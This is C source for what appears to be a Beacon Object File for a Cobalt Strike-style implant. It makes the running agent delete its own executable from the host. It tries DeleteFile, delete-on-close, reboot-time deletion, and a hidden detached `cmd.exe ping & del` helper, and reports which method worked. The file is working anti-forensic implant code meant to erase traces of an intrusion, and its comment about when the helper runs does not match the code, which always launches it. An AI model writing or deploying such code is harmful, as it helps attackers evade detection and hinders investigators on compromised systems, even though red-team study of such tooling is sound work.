/*
 * bof-selfdelete [reboot|force]
 *
 * Try to remove the running agent image:
 *   1. DeleteFile (fails while the image is mapped)
 *   2. open with FILE_FLAG_DELETE_ON_CLOSE (delete when last handle goes)
 *   3. MoveFileEx(MOVEFILE_DELAY_UNTIL_REBOOT)  (needs admin)
 *   4. detached `cmd.exe /c ping ... & del ...` helper
 *
 * Windows cannot unmap the running image without terminating the process, so
 * in practice `reboot` or `force` (detached helper) is what actually works.
 * The command prints which strategy was accepted.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static int try_helper(const char *path)
{
    char cmd[1024];
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    BOOL ok;

    bof_strncpy(cmd, "cmd.exe /c ping 127.0.0.1 -n 3 >nul & del /f /q \"",
                sizeof(cmd));
    bof_strncat(cmd, path, sizeof(cmd) - bof_strlen(cmd) - 1);
    bof_strncat(cmd, "\"", sizeof(cmd) - bof_strlen(cmd) - 1);

    bof_memzero(&si, sizeof(si));
    bof_memzero(&pi, sizeof(pi));
    si.cb = sizeof(si);
    ok = KERNEL32$CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                                 CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL,
                                 &si, &pi);
    if (ok) {
        KERNEL32$CloseHandle(pi.hThread);
        KERNEL32$CloseHandle(pi.hProcess);
    }
    return ok;
}

void go(char *args, int alen)
{
    datap parser;
    char *mode = "";
    int mlen = 0;
    char path[MAX_PATH];
    HANDLE h;
    DWORD n;

    BeaconDataParse(&parser, args, alen);
    mode = BeaconDataExtract(&parser, &mlen);
    if (!mode) mode = "";

    n = KERNEL32$GetModuleFileNameA(NULL, path, sizeof(path));
    if (!n || n >= sizeof(path)) {
        BeaconPrintf(CALLBACK_ERROR, "GetModuleFileName failed\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] image: %s\n", path);

    if (KERNEL32$DeleteFileA(path)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] DeleteFile succeeded\n");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] DeleteFile: %lu (image is mapped)\n",
                 (unsigned long)KERNEL32$GetLastError());

    h = KERNEL32$CreateFileA(path, DELETE,
                             FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                             NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[+] opened with FILE_FLAG_DELETE_ON_CLOSE (deletes when unmapped)\n");
        KERNEL32$CloseHandle(h);
    }

    if (bof_stricmp(mode, "reboot") == 0 || bof_stricmp(mode, "force") == 0) {
        if (KERNEL32$MoveFileExA(path, NULL, MOVEFILE_DELAY_UNTIL_REBOOT))
            BeaconPrintf(CALLBACK_OUTPUT, "[+] scheduled for deletion on reboot\n");
        else
            BeaconPrintf(CALLBACK_OUTPUT, "[*] MoveFileEx: %lu\n",
                         (unsigned long)KERNEL32$GetLastError());
    }

    if (try_helper(path))
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[+] detached cleanup helper started (deletes after agent exits)\n");
    else
        BeaconPrintf(CALLBACK_ERROR, "helper launch failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());

    BeaconPrintf(CALLBACK_OUTPUT,
                 "[*] the image cannot be removed while this process is alive\n");
}
